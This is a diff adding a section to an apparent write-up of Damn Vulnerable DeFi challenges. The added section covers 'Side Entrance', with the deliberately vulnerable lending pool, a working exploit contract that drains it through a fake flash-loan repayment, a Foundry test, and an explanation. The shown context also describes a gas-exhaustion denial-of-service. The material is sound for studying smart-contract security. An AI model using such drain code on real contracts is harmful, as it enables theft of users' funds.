@@ -911,3 +911,107 @@ contract MaliciousPartner {
 
 ### Exploit
 To complete this challenge, we have to deny the owner from withdrawing funds when they call `withdraw`, essentially carrying out a DOS attack. Exploiting this contract requires some understanding of EIP-150 and the 63/64 Rule for gas. When `partner.call{value: amountToSend}("");` is executed, 63/64 of the available gas will be forwarded to `partner`, while 1/64 of the gas remains with the contract. By setting `partner` as a malicious contract with an infinite loop in the `receive` function, when `partner` receives ether from the contract, this infinite loop will execute and continue running until all the gas is consumed before the `payable(owner).transfer(amountToSend);` is executed. Since the return value was ignored in the low level `.call`, the failure in the `partner` would go unchecked in the event of any failure. The main contract will try to execute the transfer to `owner` but this will fail as the contract only has 1/64 gas, which is insufficient to continue executing the rest of the function. An error `EvmError: OutOfGas` will be thrown and `owner` will not be able to receive funds
+
+## Damn Vulnerable DeFi (Foundry): Side Entrance
+Link: https://github.com/nicolasgarcia214/damn-vulnerable-defi-foundry/tree/master/test/Levels/side-entrance
+
+### Contracts
+- `src/Week8-9/SideEntranceLenderPool.sol`
+```
+import {Address} from "@openzeppelin/contracts/utils/Address.sol";
+
+interface IFlashLoanEtherReceiver {
+    function execute() external payable;
+}
+
+/**
+ * @title SideEntranceLenderPool
+ * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ */
+contract SideEntranceLenderPool {
+    using Address for address payable;
+
+    mapping(address => uint256) private balances;
+
+    error NotEnoughETHInPool();
+    error FlashLoanHasNotBeenPaidBack();
+
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() external {
+        uint256 amountToWithdraw = balances[msg.sender];
+        balances[msg.sender] = 0;
+        payable(msg.sender).sendValue(amountToWithdraw);
+    }
+
+    function flashLoan(uint256 amount) external {
+        uint256 balanceBefore = address(this).balance;
+        if (balanceBefore < amount) revert NotEnoughETHInPool();
+
+        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
+
+        if (address(this).balance < balanceBefore) {
+            revert FlashLoanHasNotBeenPaidBack();
+        }
+    }
+}
+
+contract Exploit is IFlashLoanEtherReceiver {
+    SideEntranceLenderPool pool;
+
+    constructor(SideEntranceLenderPool _pool) {
+        pool = _pool;
+    }
+
+    receive() external payable {}
+
+    //flashLoan calls `execute`, which we can use to "deposit" the loan
+    //amount back into the pool, under disguise of a regular deposit.
+    function execute() external payable override {
+        pool.deposit{value: msg.value}();
+    }
+
+    function exploit() public {
+        uint256 poolBalance = address(pool).balance;
+        pool.flashLoan(poolBalance);
+        pool.withdraw();
+    }
+}
+```
+- `src/Week8-9/SideEntranceLenderPool.t.sol`
+```
+contract SideEntranceTest is Test {
+    SideEntranceLenderPool pool;
+    Exploit exploitContract;
+    address owner;
+    address attacker;
+
+    function setUp() public {
+        pool = new SideEntranceLenderPool();
+        exploitContract = new Exploit(pool);
+        owner = address(this);
+        attacker = address(0xdead);
+
+        vm.deal(address(pool), 1_000 ether);
+        vm.deal(address(attacker), 1 ether);
+    }
+
+    function testExploit() public {
+        vm.startPrank(attacker);
+        exploitContract.exploit();
+
+        _checkSolved();
+    }
+
+    function _checkSolved() internal {
+        assertTrue(address(pool).balance == 0, "Challenge Incomplete");
+    }
+}
+```
+
+### Exploit
+The goal of the exploit is to drain all 1000 ETH from the lending pool. In the `SideEntranceLenderPool` contract, calling `flashLoan` calls the `execute` hook on the receiving contract. Because `deposit` does not have any restrictions on how/when it can be called, it can be used in the `execute` hook to fake a deposit by calling `deposit` with the flash loan amount to seemingly repay the loaned amount, and then `withdraw` can be called to transfer out the original requested loan amount without needing to pay it back.
+
+In the `exploit` function in the attacking contract, we call `flashLoan` with the balance of the lending pool as the loan amount. The `flashLoan` would then call the `execute` hook in our attacking contract with the balance of the lending pool as `msg.value`. In the `execute` hook, we call `deposit` and simply forward `msg.value` to the lending contract. This tricks the lending contract into thinking that we made a deposit into the lending pool, and we are able to bypass the `address(this).balance < balanceBefore` check at the end of the flash loan call because the balance returned to it original value in `balanceBefore`. By the end of `flashLoan`, the attacking contract would have the original flash loan amount recorded as its balance, and it can simply execute `withdraw` to transfer out the balance of the lending pool.
